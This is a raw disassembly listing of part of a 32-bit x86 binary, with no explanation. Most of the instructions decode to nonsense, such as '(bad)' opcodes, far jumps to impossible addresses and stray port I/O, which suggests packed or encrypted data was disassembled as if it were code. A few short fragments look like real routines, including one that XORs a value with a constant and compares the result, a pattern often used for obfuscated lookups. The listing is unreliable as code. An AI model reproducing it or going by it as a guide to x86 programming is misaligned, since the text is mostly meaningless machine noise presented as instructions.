  40b463:	cmp    BYTE PTR [ecx+0x34361f06],al
  40b469:	dec    ecx
  40b46a:	ss iret 
  40b46c:	mov    cl,0x1
  40b46e:	lea    ebx,[eax-0x1d]
  40b471:	adc    al,BYTE PTR [eax+ebx*2-0x5b]
  40b475:	mov    ds:0xbd004e3,al
  40b47a:	add    BYTE PTR [ebp+eiz*2-0x4c],bh
  40b47e:	into   
  40b47f:	into   
  40b480:	cmp    DWORD PTR [edx],edi
  40b482:	mov    ebp,0xf1a469c6
  40b487:	mov    ds:0xf901ec28,eax
  40b48c:	clc    
  40b48d:	ins    BYTE PTR es:[edi],dx
  40b48e:	mov    bl,0x20
  40b490:	stc    
  40b491:	adc    DWORD PTR [edi],edx
  40b493:	jge    0x40b4bb
  40b495:	sbb    ah,bl
  40b497:	lods   al,BYTE PTR ds:[esi]
  40b498:	mov    ebx,0x13f02885
  40b49d:	pop    ebp
  40b49e:	sbb    edx,DWORD PTR [eax+0x1b]
  40b4a1:	leave  
  40b4a2:	out    0xbc,eax
  40b4a4:	idiv   DWORD PTR [esi-0x45]
  40b4a7:	ror    edx,0xf4
  40b4aa:	cmp    DWORD PTR [ecx+edi*4],esi
  40b4ad:	inc    edx
  40b4ae:	pop    edx
  40b4af:	int3   
  40b4b0:	add    ah,bl
  40b4b2:	adc    BYTE PTR [ecx],bh
  40b4b4:	fisttp QWORD PTR [ebp-0x55]
  40b4b7:	xchg   ebx,eax
  40b4b8:	cmp    al,BYTE PTR [eax]
  40b4ba:	xlat   BYTE PTR ds:[ebx]
  40b4bb:	mov    edx,0xd718932d
  40b4c0:	push   ebp
  40b4c1:	ror    bl,1
  40b4c3:	mov    bh,0xa
  40b4c5:	(bad)  
  40b4c6:	cli    
  40b4c7:	test   ebx,esp
  40b4c9:	sbb    al,0x8d
  40b4cb:	adc    BYTE PTR [edx-0x10],al
  40b4ce:	in     al,0x5a
  40b4d0:	dec    cl
  40b4d2:	into   
  40b4d3:	loopne 0x40b47f
  40b4d5:	mov    DWORD PTR [ebp-0x2c],ecx
  40b4d8:	mov    eax,DWORD PTR [ebp-0x14]
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	call   DWORD PTR [ecx-0x5c]
  40b50a:	inc    eax
  40b50b:	call   0x38bf3400
  40b510:	jl     0x40b590
  40b512:	jle    0x40b58c
  40b514:	icebp  
  40b515:	inc    esi
  40b516:	xchg   esi,eax
  40b517:	and    al,0xd9
  40b519:	lahf   
  40b51a:	xor    eax,0xeaa09e85
  40b51f:	xchg   ebp,eax
  40b520:	int    0x30
  40b522:	or     eax,edi
  40b524:	xchg   ebp,eax
  40b525:	mov    ecx,0xfc4ad7b
  40b52a:	fisttp DWORD PTR [ecx-0x17252290]
  40b530:	outs   dx,BYTE PTR ds:[esi]
  40b531:	pop    ss
  40b532:	or     ebp,DWORD PTR [esi+0x2ea50f17]
  40b538:	stc    
  40b539:	adc    DWORD PTR [edx-0x42a36ebd],ebp
  40b53f:	xchg   esi,eax
  40b540:	lods   al,BYTE PTR ds:[esi]
  40b541:	add    DWORD PTR [esi+0x3bbba346],ebx
  40b547:	cmp    ebx,DWORD PTR [ebp-0x20e9f02c]
  40b54d:	mov    bl,0xf1
  40b54f:	sub    DWORD PTR [ebx+0x4d9d83c9],ecx
  40b555:	jo     0x40b56f
  40b557:	mov    gs,esi
  40b559:	aas    
  40b55a:	test   bl,al
  40b55c:	test   al,0x2
  40b55e:	xor    al,0xe9
  40b560:	(bad)  
  40b561:	jmp    0x8d89:0x881acc80
  40b568:	sti    
  40b569:	mov    eax,0xabaaeb78
  40b56e:	int    0xdd
  40b570:	retf   0x2a87
  40b573:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b574:	xchg   BYTE PTR [ebx+0x57],ch
  40b577:	test   eax,0x10da11ed
  40b57c:	and    bh,dl
  40b57e:	adc    ebp,DWORD PTR [ebx-0x692c1bcd]
  40b584:	lahf   
  40b585:	mov    dh,0x29
  40b587:	mov    al,0xdc
  40b589:	loopne 0x40b572
  40b58b:	cmp    ebx,ebp
  40b58d:	std    
  40b58e:	ss fadd st(4),st
  40b591:	loope  0x40b5d0
  40b593:	or     dh,BYTE PTR [edi+eax*1+0x20]
  40b597:	mov    edx,0x95905893
  40b59c:	aad    0xd4
  40b59e:	outs   dx,BYTE PTR ds:[esi]
  40b59f:	mov    ds:0xab37fdd7,al
  40b5a4:	daa    
  40b5a5:	jg     0x40b5f1
  40b5a7:	push   edx
  40b5a8:	xor    bl,cl
  40b5aa:	test   DWORD PTR [ecx+0x6e],esi
  40b5ad:	fwait
  40b5ae:	gs or  cl,0xcb
  40b5b2:	add    dh,BYTE PTR [ebx-0x534e7a65]
  40b5b8:	mov    dl,0x90
  40b5ba:	or     BYTE PTR [eax-0x3860df17],bl
  40b5c0:	adc    BYTE PTR ds:0xc284440f,ch
  40b5c6:	ds arpl dx,si
  40b5c9:	mov    bh,0xb4
  40b5cb:	scas   al,BYTE PTR es:[edi]
  40b5cc:	jae    0x40b5c2
  40b5ce:	cmc    
  40b5cf:	mov    al,ds:0xd141ea25
  40b5d4:	cld    
  40b5d5:	into   
  40b5d6:	loope  0x40b5a9
  40b5d8:	jmp    0x6f856530
  40b5dd:	jns    0x40b5b8
  40b5df:	ins    DWORD PTR es:[edi],dx
  40b5e0:	sub    BYTE PTR [eax+0x70],0x13
  40b5e4:	or     ch,bh
  40b5e6:	es cli 
  40b5e8:	or     eax,0xe0c1b268
  40b5ed:	shr    WORD PTR [ebx-0x267c6d2e],1
  40b5f4:	xchg   edx,eax
  40b5f5:	pop    ebp
  40b5f6:	inc    ebp
  40b5f7:	mov    bl,0xb3
  40b5f9:	jg     0x40b662
  40b5fb:	inc    esi
  40b5fc:	test   al,0x1c
  40b5fe:	jmp    0xf6ef:0x8b160fc9
  40b605:	gs pop ecx
  40b607:	aad    0x3a
  40b609:	cmp    DWORD PTR [esp+ebp*8],ecx
  40b60c:	mov    ecx,0x7b0cedb4
  40b611:	push   cs
  40b612:	cmp    ebp,eax
  40b614:	gs jns 0x40b5ce
  40b617:	adc    BYTE PTR ds:0x92f9cb10,cl
  40b61d:	iret   
  40b61e:	(bad)  [eax+ebp*8]
  40b621:	jmp    0xad7d2188
  40b626:	jmp    0x40b650
  40b628:	jno    0x40b5b2
  40b62a:	sub    ebx,esp
  40b62c:	add    BYTE PTR ds:0x984d356,bh
  40b632:	icebp  
  40b633:	mov    dl,0x4a
  40b635:	ins    BYTE PTR es:[edi],dx
  40b636:	out    0xb3,al
  40b638:	fmul   DWORD PTR [edi+0x5070fdcd]
  40b63e:	and    eax,0xf69a4f6e
  40b643:	adc    al,0x58
  40b645:	into   
  40b646:	or     al,0x77
  40b648:	xor    al,0x53
  40b64a:	mov    cl,0xbb
  40b64c:	adc    eax,0x9ad64656
  40b651:	sbb    BYTE PTR [edx-0x33b59d3a],ch
  40b657:	jo     0x40b659
  40b659:	aaa    
  40b65a:	cdq    
  40b65b:	(bad)  
  40b65c:	jmp    0x40b653
  40b65e:	xchg   ebx,eax
  40b65f:	enter  0xf638,0xed
  40b663:	add    eax,DWORD PTR [eax-0x1e]
  40b666:	mov    bl,0x25
  40b668:	lods   al,BYTE PTR ds:[esi]
  40b669:	adc    edi,esp
  40b66b:	push   cs
  40b66c:	sbb    eax,0x144f0a82
  40b671:	test   DWORD PTR [eax],ebp
  40b673:	sub    DWORD PTR [ebx-0x2f9e141d],ebp
  40b679:	cwde   
  40b67a:	push   0x915602d3
  40b67f:	rcl    al,1
  40b681:	mov    dl,0x78
  40b683:	stc    
  40b684:	lods   eax,DWORD PTR ds:[esi]
  40b685:	fxtract 
  40b687:	mov    esp,0xd42a764
  40b68c:	adc    BYTE PTR fs:[ebp+0x6582fa2a],0x4
  40b694:	xchg   DWORD PTR [eax+0x75],ebx
  40b697:	pop    ecx
  40b698:	enter  0x1076,0x68
  40b69c:	inc    eax
  40b69d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b69e:	jb     0x40b70c
  40b6a0:	and    dh,BYTE PTR [edi]
  40b6a2:	push   esi
  40b6a3:	add    BYTE PTR [ebx-0x231bb64a],ah
  40b6a9:	or     BYTE PTR [esi-0x10],0xce
  40b6ad:	sbb    esp,DWORD PTR [edi]
  40b6af:	lods   al,BYTE PTR ds:[esi]
  40b6b0:	test   BYTE PTR [ebp-0x73cd4461],dh
  40b6b6:	out    0xfe,eax
  40b6b8:	xlat   BYTE PTR ds:[ebx]
  40b6b9:	aam    0x83
  40b6bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6bc:	xor    bh,ch
  40b6be:	in     eax,dx
  40b6bf:	add    al,BYTE PTR [edx-0x1e]
  40b6c2:	sti    
  40b6c3:	push   ss
  40b6c4:	pop    edi
  40b6c5:	ret    
  40b6c6:	leave  
  40b6c7:	repz shl BYTE PTR [edi+0x57b51ebc],0x9c
  40b6cf:	sub    al,0xad
  40b6d1:	outs   dx,DWORD PTR ds:[esi]
  40b6d2:	outs   dx,DWORD PTR ds:[esi]
  40b6d3:	xchg   BYTE PTR [ebx],dh
  40b6d5:	xchg   esp,eax
  40b6d6:	mov    eax,ds:0x84a4ade3
  40b6db:	scas   eax,DWORD PTR es:[edi]
  40b6dc:	push   esp
  40b6dd:	(bad)  
  40b6de:	cli    
  40b6df:	mov    esp,0x7239281b
  40b6e4:	dec    ebp
  40b6e5:	imul   esi,DWORD PTR [edx],0x58c4a55e
  40b6eb:	fcomp  DWORD PTR [ebx-0x1641511b]
  40b6f1:	jno    0x40b682
  40b6f3:	js     0x40b6ec
  40b6f5:	push   DWORD PTR [ebp+0x130ff17d]
  40b6fb:	mov    gs,WORD PTR [eax+edx*1]
  40b6fe:	push   ds
  40b6ff:	or     BYTE PTR [edi-0x14326f78],0xc
  40b706:	xchg   esi,eax
  40b707:	jbe    0x40b746
  40b709:	je     0x40b70b
  40b70b:	mov    ch,0xd0
  40b70d:	sub    ebp,DWORD PTR [ebx+edx*8-0x316e41f1]
  40b714:	bound  edi,QWORD PTR [eax+0x41345ebc]
  40b71a:	adc    al,0xd8
  40b71c:	je     0x40b6c4
  40b71e:	cdq    
  40b71f:	push   ebx
  40b720:	inc    ebx
  40b721:	add    eax,0xa1ec29e4
  40b726:	ins    DWORD PTR es:[edi],dx
  40b727:	cmp    DWORD PTR [ebx+0x22],esi
  40b72a:	inc    ecx
  40b72b:	jb     0x40b700
  40b72d:	adc    BYTE PTR [edx-0x7d47deb5],ch
  40b733:	ja     0x40b742
  40b735:	imul   edi,eax,0x28
  40b738:	mov    ds:0xd0579f8b,eax
  40b73d:	into   
  40b73e:	cli    
  40b73f:	enter  0xfe61,0x91
  40b743:	das    
  40b744:	lods   eax,DWORD PTR ds:[esi]
  40b745:	mov    fs,WORD PTR [eax-0x1a]
  40b748:	(bad)  
  40b749:	js     0x40b7b6
  40b74b:	popf   
  40b74c:	mov    al,BYTE PTR [ebx+eiz*2-0x16]
  40b750:	js     0x40b735
  40b752:	xchg   esp,eax
  40b753:	cmc    
  40b754:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b755:	inc    esp
  40b756:	mov    bh,0xb8
  40b758:	cmp    bh,bh
  40b75a:	jne    0x40b72c
  40b75c:	push   DWORD PTR [ebp+0xc]
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	cld    
  40b78b:	push   esi
  40b78c:	jb     0x40b728
  40b78e:	mov    dl,0xfe
  40b790:	jle    0x40b810
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	and    al,0xa7
  40b798:	rol    edx,cl
  40b79a:	and    eax,0xda706547
  40b79f:	xor    ebp,ebp
  40b7a1:	sbb    eax,DWORD PTR [eax-0x37]
  40b7a4:	stos   DWORD PTR es:[edi],eax
  40b7a5:	fcom   QWORD PTR [ecx]
  40b7a7:	shl    BYTE PTR [ecx],cl
  40b7a9:	cmp    al,0x2d
  40b7ab:	imul   esp,ebp,0x1714205d
  40b7b1:	xor    ecx,DWORD PTR [ebx+eax*8-0x1b12d6e2]
  40b7b8:	scas   eax,DWORD PTR es:[edi]
  40b7b9:	inc    esi
  40b7ba:	sub    eax,0xe85f1489
  40b7bf:	mov    edx,DWORD PTR [ecx-0x17]
  40b7c2:	into   
  40b7c3:	daa    
  40b7c4:	(bad)  
  40b7c5:	jnp    0x40b7f5
  40b7c7:	(bad)  
  40b7c9:	pop    ebp
  40b7ca:	cs das 
  40b7cc:	jns    0x40b7a2
  40b7ce:	sub    al,0xc6
  40b7d0:	add    al,0x81
  40b7d2:	loop   0x40b7b9
  40b7d4:	pop    ecx
  40b7d5:	and    ebx,esi
  40b7d7:	into   
  40b7d8:	mov    ds:0xf1cbea26,eax
  40b7dd:	retf   
  40b7de:	fcomp  DWORD PTR [edx+0x49]
  40b7e1:	test   eax,0xa96e2e7a
  40b7e6:	jecxz  0x40b7c8
  40b7e8:	or     dl,cl
  40b7ea:	fs push esp
  40b7ec:	pushf  
  40b7ed:	not    DWORD PTR [ecx+0x37]
  40b7f0:	jl     0x40b77d
  40b7f2:	je     0x40b861
  40b7f4:	mov    eax,ds:0xedca6b3e
  40b7f9:	ja     0x40b7d9
  40b7fb:	dec    ebp
  40b7fc:	xbegin 0xd3a01222
  40b802:	adc    BYTE PTR [esi-0x2c11cdca],0x86
  40b809:	sahf   
  40b80a:	dec    edi
  40b80b:	popf   
  40b80c:	jno    0x40b838
  40b80e:	mov    edi,0x9f966264
  40b813:	jmp    0x74de:0xb1c2e425
  40b81a:	bound  esi,QWORD PTR [ecx+0x230d941b]
  40b820:	in     eax,dx
  40b821:	xchg   edx,eax
  40b822:	jo     0x40b848
  40b824:	test   al,0xcd
  40b826:	jp     0x40b8a1
  40b828:	aaa    
  40b829:	and    al,0x86
  40b82b:	xor    al,0xc8
  40b82d:	cmp    DWORD PTR [ebx-0x39],esi
  40b830:	and    DWORD PTR [eax-0x39],edi
  40b833:	mov    dl,ch
  40b835:	shl    DWORD PTR [edx+0x61],1
  40b838:	or     ebp,DWORD PTR [ecx-0x6173b25c]
  40b83e:	repnz inc esi
  40b840:	mov    edx,0xf1f12f50
  40b845:	pop    esp
  40b846:	cmp    eax,0x6821035c
  40b84b:	mov    al,0x71
  40b84d:	mov    cs:0x5f1431fc,eax
  40b853:	ins    DWORD PTR es:[edi],dx
  40b854:	push   es
  40b855:	or     BYTE PTR [edx],ah
  40b857:	or     eax,0x75fc070c
  40b85c:	xchg   DWORD PTR [edi-0x55d5525f],esp
  40b862:	outs   dx,DWORD PTR ds:[esi]
  40b863:	lahf   
  40b864:	add    BYTE PTR [edx],ah
  40b866:	or     eax,0x24ba94aa
  40b86b:	pop    ebp
  40b86c:	imul   esi,DWORD PTR [eax+0x14],0x744b8422
  40b873:	jl     0x40b866
  40b875:	stos   BYTE PTR es:[edi],al
  40b876:	dec    ebp
  40b877:	dec    ebp
  40b878:	shr    DWORD PTR [ebx-0x39a3d503],cl
  40b87e:	ret    0x4bb2
  40b881:	and    ah,BYTE PTR ds:0xa48dcd17
  40b887:	push   edx
  40b888:	ret    
  40b889:	mov    ebp,DWORD PTR [eax]
  40b88b:	mov    al,ds:0x7d964221
  40b890:	inc    eax
  40b891:	icebp  
  40b892:	daa    
  40b893:	add    DWORD PTR [edi],eax
  40b895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b896:	int    0x3d
  40b898:	mov    WORD PTR [edx-0x34e6afb3],cs
  40b89e:	mov    WORD PTR [ebp-0x9a2abe6],?
  40b8a4:	or     al,0x84
  40b8a6:	shl    BYTE PTR [esi-0x52a0a3d0],1
  40b8ac:	pop    edx
  40b8ad:	lahf   
  40b8ae:	outs   dx,DWORD PTR ds:[esi]
  40b8af:	into   
  40b8b0:	cs dec esp
  40b8b2:	addr16 sti 
  40b8b4:	push   ds
  40b8b5:	mov    ah,0xd6
  40b8b7:	inc    ecx
  40b8b8:	or     eax,0x1e948b35
  40b8bd:	sar    DWORD PTR [edi+0x42],1
  40b8c0:	ds dec edi
  40b8c2:	es scas al,BYTE PTR es:[edi]
  40b8c4:	fldenv [edx-0x61051fe]
  40b8ca:	retf   
  40b8cb:	repz cdq 
  40b8cd:	inc    ebp
  40b8ce:	and    cl,BYTE PTR [eax+0x5e8affb0]
  40b8d4:	xchg   edx,eax
  40b8d5:	addr16 retf 0x16c8
  40b8d9:	adc    al,0x95
  40b8db:	push   ss
  40b8dc:	hlt    
  40b8dd:	pusha  
  40b8de:	ds mov ecx,0x228c9524
  40b8e4:	test   eax,0xfadf736
  40b8e9:	pop    eax
  40b8ea:	es inc eax
  40b8ec:	push   edx
  40b8ed:	dec    ebp
  40b8ee:	add    al,0xb2
  40b8f0:	jge    0x40b89c
  40b8f2:	add    DWORD PTR [ecx],ebp
  40b8f4:	push   ds
  40b8f5:	pop    edi
  40b8f6:	shl    DWORD PTR [ebx+edx*1-0x75],cl
  40b8fa:	or     ch,BYTE PTR [esi]
  40b8fc:	fdivr  QWORD PTR [ebp-0x64]
  40b8ff:	xor    eax,0x5d511d8e
  40b904:	or     DWORD PTR [ebx-0x7d],edi
  40b907:	dec    esi
  40b908:	cmp    al,BYTE PTR [edi]
  40b90a:	fwait
  40b90b:	xor    DWORD PTR [edi],eax
  40b90d:	leave  
  40b90e:	iret   
  40b90f:	sti    
  40b910:	int3   
  40b911:	inc    edi
  40b912:	mov    bh,0xc2
  40b914:	or     al,0x8a
  40b916:	mov    BYTE PTR [ebp+0x5a405323],cl
  40b91c:	les    ebx,FWORD PTR [edx+0x77d50b6f]
  40b922:	fidiv  WORD PTR [esi]
  40b924:	cmp    ah,BYTE PTR [ecx]
  40b926:	jne    0x40b90a
  40b928:	add    eax,0xc97bc493
  40b92d:	or     bh,dl
  40b92f:	push   ds
  40b930:	(bad)  
  40b931:	jl     0x40b99c
  40b933:	repz cmp al,0xe8
  40b936:	xchg   edi,eax
  40b937:	or     ah,BYTE PTR [eax-0x37]
  40b93a:	test   BYTE PTR [ebx+0x678be4ac],ch
  40b940:	movlhps xmm1,xmm7
  40b943:	loop   0x40b933
  40b945:	popa   
  40b946:	jp     0x40b97c
  40b948:	repz shr BYTE PTR [esi],0xa9
  40b94c:	and    al,0x82
  40b94e:	dec    ecx
  40b94f:	(bad)  
  40b951:	xchg   esp,eax
  40b952:	jo     0x40b90f
  40b954:	stos   DWORD PTR es:[edi],eax
  40b955:	jle    0x40b990
  40b957:	scas   al,BYTE PTR es:[edi]
  40b958:	pop    ds
  40b959:	cmp    ch,BYTE PTR [edx+0x3b]
  40b95c:	mov    ebp,0x8352ab00
  40b961:	js     0x40b90a
  40b963:	jae    0x40b960
  40b965:	jne    0x40b979
  40b967:	mov    ds:0x514f56cf,al
  40b96c:	and    al,BYTE PTR [edi+0x34]
  40b96f:	inc    esi
  40b970:	xlat   BYTE PTR ds:[ebx]
  40b971:	or     eax,0x6229116c
  40b976:	gs push edi
  40b978:	push   esp
  40b979:	sahf   
  40b97a:	fwait
  40b97b:	pop    esi
  40b97c:	jb     0x40b98c
  40b97e:	fcmove st,st(4)
  40b980:	mov    ecx,0xd4726da0
  40b985:	fwait
  40b986:	dec    edi
  40b987:	mov    al,ds:0x75bba07e
  40b98c:	out    dx,al
  40b98d:	stc    
  40b98e:	cmp    eax,0x118e9785
  40b993:	mov    DWORD PTR [edi-0x6e],esi
  40b996:	in     al,0x1f
  40b998:	sahf   
  40b999:	push   ds
  40b99a:	ficomp WORD PTR [edi+0x1b]
  40b99d:	and    al,0xf
  40b99f:	push   edx
  40b9a0:	xlat   BYTE PTR ds:[ebx]
  40b9a1:	jno    0x40b9bb
  40b9a3:	xor    al,0x9f
  40b9a5:	jg     0x40b9a9
  40b9a7:	fs test ebp,edi
  40b9aa:	ss or  al,0x8c
  40b9ad:	cmp    BYTE PTR [edi+0x1],cl
  40b9b0:	jmp    0x40b954
  40b9b2:	mov    edi,0x3b0734cc
  40b9b7:	mov    bl,0xb4
  40b9b9:	loopne 0x40b9f2
  40b9bb:	adc    al,0x1f
  40b9bd:	sub    eax,0x2ec424
  40b9c2:	sub    eax,0x38c32803
  40b9c7:	(bad)  
  40b9c8:	xchg   ecx,eax
  40b9c9:	inc    eax
  40b9ca:	sub    ah,BYTE PTR ds:0x58b74af1
  40b9d0:	mov    edx,0xffd754ff
  40b9d5:	pop    ebx
  40b9d6:	push   0xb2cd5b3d
  40b9db:	jbe    0x40b968
  40b9dd:	inc    ebp
  40b9de:	loopne 0x40ba27
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8+0x985a808],eax
  40ba0f:	imul   esi,DWORD PTR [edx+0x7c],0xfffffffd
  40ba13:	jle    0x40ba93
  40ba15:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ba19:	jne    0x40ba28
  40ba1b:	add    eax,0xdad03cbb
  40ba20:	in     al,dx
  40ba21:	push   ecx
  40ba22:	mov    esi,0xfe118614
  40ba27:	fldenv [ebx+0x249b5ee5]
  40ba2d:	fcmovnb st,st(5)
  40ba2f:	xchg   DWORD PTR [esi+0x0],eax
  40ba32:	jp     0x40ba4b
  40ba34:	mov    ds:0x5dc046e1,al
  40ba39:	or     BYTE PTR [esi+ebx*8],0x60
  40ba3d:	sub    eax,0x4f6a3fd0
  40ba42:	xor    DWORD PTR [edx],ecx
  40ba44:	sub    ecx,DWORD PTR [eax-0x54b4496a]
  40ba4a:	jl     0x40ba1e
  40ba4c:	lods   eax,DWORD PTR ds:[esi]
  40ba4d:	es pop edx
  40ba4f:	mov    ebx,0x345efca1
  40ba54:	dec    eax
  40ba55:	in     al,0x7c
  40ba57:	jno    0x40b9e5
  40ba59:	ret    0xfff0
  40ba5c:	or     edi,0x58d297b9
  40ba62:	and    DWORD PTR [edi+0x44],esi
  40ba65:	adc    esp,edi
  40ba67:	pop    ds
  40ba68:	clc    
  40ba69:	mov    ah,0xe5
  40ba6b:	or     dl,BYTE PTR [esi-0x565ec8bb]
  40ba71:	pusha  
  40ba72:	not    BYTE PTR [edi+ebx*4]
  40ba75:	bound  ebx,QWORD PTR [edi+0x726cfd8e]
  40ba7b:	jns    0x40bada
  40ba7d:	scas   al,BYTE PTR es:[edi]
  40ba7e:	outs   dx,DWORD PTR ds:[esi]
  40ba7f:	push   cs
  40ba80:	cmp    bh,BYTE PTR [esi+0x99b9c10]
  40ba86:	inc    ecx
  40ba87:	pop    edi
  40ba88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba89:	scas   eax,DWORD PTR es:[edi]
  40ba8a:	cdq    
  40ba8b:	mov    eax,0x30d02e50
  40ba90:	push   eax
  40ba91:	or     esi,DWORD PTR [esi]
  40ba93:	hlt    
  40ba94:	(bad)  
  40ba95:	push   ebx
  40ba96:	push   0x227c1bd3
  40ba9b:	and    al,0x3f
  40ba9d:	mov    dh,0xd1
  40ba9f:	xor    DWORD PTR [ebp+0x38],ebx
  40baa2:	xchg   ebp,eax
  40baa3:	cmp    eax,0x99bbbc83
  40baa8:	les    eax,FWORD PTR [esi-0x1f]
  40baab:	sbb    al,0xb1
  40baad:	cld    
  40baae:	jnp    0x40ba48
  40bab0:	and    edi,ebx
  40bab2:	mov    ebp,0x5ae54108
  40bab7:	stc    
  40bab8:	adc    dl,bl
  40baba:	pop    esi
  40babb:	mov    BYTE PTR [eax+0x51],bl
  40babe:	xchg   ecx,eax
  40babf:	push   0x4d
  40bac1:	shr    BYTE PTR [ebp-0x4dc9e922],0x46
  40bac8:	push   0x24479e81
  40bacd:	sub    cl,BYTE PTR [eax+0x4]
  40bad0:	lds    ecx,FWORD PTR [eax+0x7e]
  40bad3:	repnz mov ebx,ebp
  40bad6:	scas   al,BYTE PTR es:[edi]
  40bad7:	scas   al,BYTE PTR es:[edi]
  40bad8:	jecxz  0x40ba66
  40bada:	js     0x40bb01
  40badc:	mov    ecx,cs
  40bade:	loopne 0x40bb32
  40bae0:	test   eax,0x25b52c2d
  40bae5:	popf   
  40bae6:	gs loop 0x40bb1a
  40bae9:	xor    DWORD PTR [ebx],esi
  40baeb:	js     0x40baf1
  40baed:	mov    bl,0x23
  40baef:	ret    0xa778
  40baf2:	xchg   ebx,eax
  40baf3:	out    dx,al
  40baf4:	pop    eax
  40baf5:	mul    BYTE PTR [edx+0x14a6375a]
  40bafb:	shl    BYTE PTR cs:[edx],1
  40bafe:	in     al,0x26
  40bb00:	lds    eax,FWORD PTR [ebx-0x3c7db9fb]
  40bb06:	and    al,0x9
  40bb08:	add    DWORD PTR [esi+0x2d],edx
  40bb0b:	lea    ebp,[ecx]
  40bb0d:	push   esp
  40bb0e:	xchg   esi,eax
  40bb0f:	lods   al,BYTE PTR ds:[esi]
  40bb10:	aam    0xb8
  40bb12:	pop    ds
  40bb13:	dec    edi
  40bb14:	in     eax,dx
  40bb15:	pusha  
  40bb16:	int    0xf3
  40bb18:	xchg   edx,eax
  40bb19:	or     al,0xed
  40bb1b:	lock add bl,ah
  40bb1e:	je     0x40bb86
  40bb20:	out    0x8e,al
  40bb22:	stc    
  40bb23:	scas   eax,DWORD PTR es:[edi]
  40bb24:	daa    
  40bb25:	dec    ecx
  40bb26:	popf   
  40bb27:	sub    ecx,DWORD PTR [ebx+edx*2-0x11]
  40bb2b:	mov    eax,ds:0x7565affc
  40bb30:	outs   dx,BYTE PTR ds:[esi]
  40bb31:	dec    edi
  40bb32:	pushf  
  40bb33:	lods   al,BYTE PTR ds:[esi]
  40bb34:	inc    ebp
  40bb35:	scas   al,BYTE PTR es:[edi]
  40bb36:	aaa    
  40bb37:	jl     0x40bb21
  40bb39:	sbb    dh,ch
  40bb3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb3c:	jle    0x40bbbd
  40bb3e:	jo     0x40bb30
  40bb40:	pushf  
  40bb41:	repnz sub eax,0xb4b7fe36
  40bb47:	pop    es
  40bb48:	outs   dx,BYTE PTR ds:[esi]
  40bb49:	clc    
  40bb4a:	or     al,BYTE PTR ds:0x96b548df
  40bb50:	push   0x2311b806
  40bb55:	mov    ecx,0x8677192c
  40bb5a:	ret    
  40bb5b:	imul   ecx,DWORD PTR [edx+0x5f0fb726],0x980280ba
  40bb65:	dec    edi
  40bb66:	data16 repnz and al,0x80
  40bb6a:	loop   0x40bbb1
  40bb6c:	outs   dx,BYTE PTR ds:[esi]
  40bb6d:	outs   dx,BYTE PTR ds:[esi]
  40bb6e:	es sbb eax,0xc4247dd7
  40bb74:	test   al,0xc6
  40bb76:	call   DWORD PTR [ebx+ebx*2-0x2f]
  40bb7a:	jmp    0xd4c6b1b1
  40bb7f:	mov    bh,0xc5
  40bb81:	mov    dh,0xe4
  40bb83:	cmp    DWORD PTR [esi+0x3c894db6],edi
  40bb89:	jmp    0x7683:0xbb28b3e0
  40bb90:	mov    ecx,DWORD PTR [eax-0x54]
  40bb93:	push   es
  40bb94:	adc    al,BYTE PTR [esi]
  40bb96:	pop    ecx
  40bb97:	pop    ss
  40bb98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb99:	popf   
  40bb9a:	cdq    
  40bb9b:	sub    ebp,DWORD PTR [edi]
  40bb9d:	daa    
  40bb9e:	xchg   esp,eax
  40bb9f:	adc    ah,dl
  40bba1:	or     edi,esp
  40bba3:	dec    edx
  40bba4:	fistp  WORD PTR [ebp-0x9090bd8]
  40bbaa:	or     bl,ch
  40bbac:	stos   BYTE PTR es:[edi],al
  40bbad:	or     BYTE PTR [eax],ah
  40bbaf:	xor    esp,DWORD PTR [ebx+0x3c7169fc]
  40bbb5:	mov    esp,0xd2168b0c
  40bbba:	mov    BYTE PTR ds:0xd3828af6,al
  40bbc0:	in     eax,dx
  40bbc1:	sub    eax,0x123ee143
  40bbc6:	shl    BYTE PTR [esi-0x4612d5dd],0xf8
  40bbcd:	das    
  40bbce:	out    0x77,al
  40bbd0:	sub    dh,dl
  40bbd2:	out    dx,al
  40bbd3:	sbb    al,0x47
  40bbd5:	nop
  40bbd6:	cmp    edi,DWORD PTR [ecx+0x25]
  40bbd9:	(bad)  
